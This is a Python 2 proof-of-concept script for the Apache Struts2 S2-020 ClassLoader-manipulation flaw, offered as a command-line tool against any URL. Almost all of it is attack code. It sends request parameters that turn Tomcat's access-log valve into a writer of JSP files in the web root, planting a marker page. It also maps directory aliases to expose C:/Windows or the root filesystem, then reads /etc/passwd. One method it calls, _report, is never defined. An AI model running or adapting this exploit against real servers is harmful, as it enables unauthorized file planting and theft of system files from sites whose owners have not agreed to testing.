#!/usr/bin/env python
# -*- coding:utf-8 -*-
import argparse
from urlparse import urlparse, urlunparse, urljoin
import time
import requests as req
import traceback

class WavsPlugin():
    def __init__(self, url):
        self.url = url
        self.banner = u'''\
# POC Name : Struts2 S2-020漏洞检测POC
# Author      : CF_HB
# Date        : 2016/06/02
# Refere      : http://drops.wooyun.org/papers/1377
#用法: python S2-020_POC.py -url http://121.42.xxx.xxx:8081/xxx/xxx.action
#POC适用范围: Tomcat6.x,Tomcat7.x,Tomcat8.x 更低的5.x，4.x没有测试环境#
结果：
存在漏洞：
    [Congratulations!!!]
    http://121.42.xxx.xxx:8081/xxx/xxx.action is vulnerable S2-020.
    浏览器访问验证-Windows目标：http://121.42.xxx.xxx:8081/xxx/S2020/explorer.exe
    浏览器访问验证-Linux目标：http://121.42.xxx.xxx:8081/xxx//S2020/etc/passwd
不存在漏洞:
    [sorry!!]
    http://www.csu.wsu.cn/index.php is no vulnerable..
'''
    def verity(self):
        print self.banner
        print "[Checking] "+self.url
        ORG_URL = self.url
        urlinfo = urlparse(ORG_URL)
        tom8_check_url = urlunparse((urlinfo.scheme, urlinfo.netloc, '/', '', '', ''))
        tom6x7x_url_two = urlunparse((urlinfo.scheme, urlinfo.netloc, urlinfo.path.split('/')[1], '', '', ''))
        self.headers = {
            'Host': urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.url,
            'banner': 's2-020 poc from cf_hb.'
           }
        poc_tom8 = []
        poc_win_tom6x7x = []
        poc_linux_tom6x7x = []
        # Tomcat 8.x Linux+Windows
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT")
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.prefix=S2020POC")
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp")
        poc_tom8.append("?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1")
        poc_tom8.append('?poc=<%out.write("This_Site_Is_Vulnerable_S2020");%>')
        # Tomcat6.x and Tomcat 7.x - Windows
        poc_win_tom6x7x.append("?class.classLoader.resources.dirContext.aliases=/S2020=C://Windows/")
        # Tomcat6.x and Tomcat 7.x - Linux
        poc_linux_tom6x7x.append("?class.classLoader.resources.dirContext.aliases=/S2020=/")
        try:
            for poc_add in poc_tom8:
                poc_url = urljoin(ORG_URL, poc_add)
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                time.sleep(1)
            checkurl = urljoin(tom8_check_url, "S2020POC1.jsp")
            # tomcat写日志难以捉摸,为了避免漏掉，测试5次每次停顿1秒
            # check 5 times
            for i in range(0, 5):
                resp = req.get(checkurl, headers=self.headers, timeout=3)
                time.sleep(1)
                if resp.status_code and "This_Site_Is_Vulnerable_S2020" in resp.content:
                    print "[Congratulations!!!]"
                    print "{url} is vulnerable S2-020.".format(url=self.url)
                    return

            # Check tomcat6.x and tomcat7.x - Windows
            for poc_add in poc_win_tom6x7x:
                poc_url = urljoin(ORG_URL, poc_add)
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                time.sleep(1)
                checkurl = tom6x7x_url_two+"/S2020/explorer.exe"
                resp = req.head(checkurl, timeout=3)
                if resp.status_code == 200:
                    size = resp.headers.get('Content-Length')
                    fsize = int(size) / 1024
                    if fsize > 1:    #检测文件大小是否大于1KB
                        print "[Congratulations!!!!!]"
                        print "{url} is vulnerable S2-020.".format(url=self.url)
                        return
            # Check tomcat6.x and tomcat7.x - Linux
            for poc_add in poc_linux_tom6x7x:
                poc_url = urljoin(ORG_URL, poc_add)
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                time.sleep(1)
                checkurl = tom6x7x_url_two+"/S2020/etc/passwd"
                resp = req.get(checkurl, headers=self.headers, timeout=3)
                if resp.status_code and ("/bin/bash" in resp.content or "root:x:0:0:root:/root" in resp.content):
                            self._report(ORG_URL)
                            return
            print "[sorry!!]"
            print "{url} is no vulnerable..".format(url=self.url)
        except Exception, e:
            print "Failed to connection target, try again.."
            return

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-url', help='the target url.')
    args = parser.parse_args()
    args_dict = args.__dict__


    try:
        if not (args_dict['url'] == None):
            url = args_dict['url']
            plg = WavsPlugin(url)
            plg.verity()
        else:
            print parser.print_usage()
            exit(0)
    except Exception,e:
        print parser.print_usage()
        exit(-1)

